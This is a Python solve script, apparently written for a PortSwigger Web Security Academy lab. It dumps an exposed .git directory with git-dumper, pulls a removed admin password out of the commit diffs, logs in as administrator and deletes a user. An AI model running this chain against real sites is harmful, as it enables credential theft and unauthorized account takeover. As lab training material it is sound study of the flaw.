#!/usr/bin/env python3
"""
Information disclosure in version control history
PortSwigger Web Security Academy -- Information Disclosure

Companion script for the writeup: 05-version-control-history.md

What this does -- and what it shells out to instead of reimplementing:
    Confirms /.git/HEAD is exposed (a "ref: refs/heads/master" body, not a 404),
    then hands the actual download off to git-dumper -- a third-party tool, not
    our own code. Git's object storage is content-addressed: most of what matters
    (packed objects, loose objects referenced only by hash) has no HTML link a
    crawler could follow, so a plain recursive fetch can't reconstruct a working
    repo. git-dumper speaks Git's own object model instead (reads HEAD, walks
    refs/packed-refs, resolves hashes to objects), which is exactly why we used
    it over PortSwigger's suggested `wget -r` -- see the writeup for the full
    comparison. This script does NOT reimplement that logic; it calls the real
    tool via subprocess, exactly as our original solve did.

    Once the repo is on disk, this script drives real `git` commands (log, diff)
    via subprocess to find the commit that removed the hardcoded ADMIN_PASSWORD,
    extracts the plaintext value still sitting in the diff's removed line, then
    logs in as administrator and deletes carlos to trigger the solve condition.

Usage:
    python 05-version-control-history.py <lab-url>
    e.g. python 05-version-control-history.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install git-dumper      # third-party tool, does the actual .git download
    A working `git` binary on PATH (used to run log/diff against the dumped repo)
"""

import os
import re
import shutil
import subprocess
import sys
import tempfile
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(verify=False, timeout=15, follow_redirects=True)

    git_head = client.get(f"{lab_url}/.git/HEAD", follow_redirects=False)
    if git_head.status_code != 200 or "ref:" not in git_head.text:
        print("[-] .git not exposed")
        return
    print(f"[+] .git exposed: {git_head.text.strip()}")

    tmpdir = tempfile.mkdtemp(prefix="gitdump_")
    print(f"[*] Downloading .git to {tmpdir} via git-dumper...")
    dump_cmd = [sys.executable, "-m", "git_dumper", f"{lab_url}/.git/", tmpdir]
    proc = subprocess.run(dump_cmd, capture_output=True, text=True, timeout=120)
    if proc.returncode != 0:
        print(f"[!] git-dumper returned {proc.returncode}")
        print(f"    stderr: {proc.stderr[:300]}")

    git_dir = os.path.join(tmpdir, ".git")
    if not os.path.exists(git_dir):
        print("[-] .git directory not downloaded properly")
        shutil.rmtree(tmpdir, ignore_errors=True)
        return

    log_result = subprocess.run(
        ["git", "log", "--oneline", "--all"], cwd=tmpdir, capture_output=True, text=True
    )
    print(f"[+] Git log:\n{log_result.stdout}")

    diff_result = subprocess.run(
        ["git", "diff", "HEAD~1"], cwd=tmpdir, capture_output=True, text=True
    )
    print(f"[+] Git diff HEAD~1:\n{diff_result.stdout[:1000]}")

    password = None
    for line in diff_result.stdout.split("\n"):
        pw_match = re.search(
            r'[-+].*(?:ADMIN_PASSWORD|password|passwd)\s*=\s*["\']?([^\s"\']+)', line, re.IGNORECASE
        )
        if pw_match:
            password = pw_match.group(1)
            print(f"[+] Found password: {password}")
            break

    if not password:
        # HEAD~1 didn't have it -- widen the search to the full patch history.
        full_diff = subprocess.run(
            ["git", "log", "-p", "--all"], cwd=tmpdir, capture_output=True, text=True
        )
        for line in full_diff.stdout.split("\n"):
            pw_match = re.search(
                r'[-+].*(?:ADMIN_PASSWORD|password|passwd)\s*=\s*["\']?([^\s"\']+)', line, re.IGNORECASE
            )
            if pw_match:
                password = pw_match.group(1)
                print(f"[+] Found password in full log: {password}")
                break

    shutil.rmtree(tmpdir, ignore_errors=True)

    if not password:
        print("[-] Could not extract password from git history")
        return

    print("[*] Logging in as administrator...")
    login_page = client.get(f"{lab_url}/login")
    csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
    csrf_data = {"csrf": csrf_match.group(1)} if csrf_match else {}
    client.post(f"{lab_url}/login", data={
        **csrf_data,
        "username": "administrator",
        "password": password,
    })

    admin_r = client.get(f"{lab_url}/admin")
    if admin_r.status_code == 200 and "carlos" in admin_r.text:
        print("[+] Admin access confirmed!")
        delete_match = re.search(r'href="(/admin/delete\?username=carlos)"', admin_r.text)
        if delete_match:
            dr = client.get(f"{lab_url}{delete_match.group(1)}")
            if "Congratulations" in dr.text or dr.status_code == 200:
                print("[+] Lab solved! (carlos deleted)")
    else:
        print(f"[-] Admin access failed: {admin_r.status_code}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
